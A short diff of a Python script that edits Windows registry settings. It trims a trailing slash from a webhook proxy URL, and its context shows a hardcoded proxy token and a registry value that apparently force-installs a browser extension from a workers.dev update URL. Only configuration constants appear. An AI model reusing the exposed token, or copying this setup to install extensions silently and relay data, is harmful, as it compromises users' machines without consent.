@@ -5,7 +5,7 @@ import time
 from pathlib import Path
 import winreg
 
-WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev/"
+WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev"
 PROXY_TOKEN = "389e0e62eaf14340b5e16d90ed1b56d79a14e07484a404bb30f0a3e9b7f64c66"
 
 EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
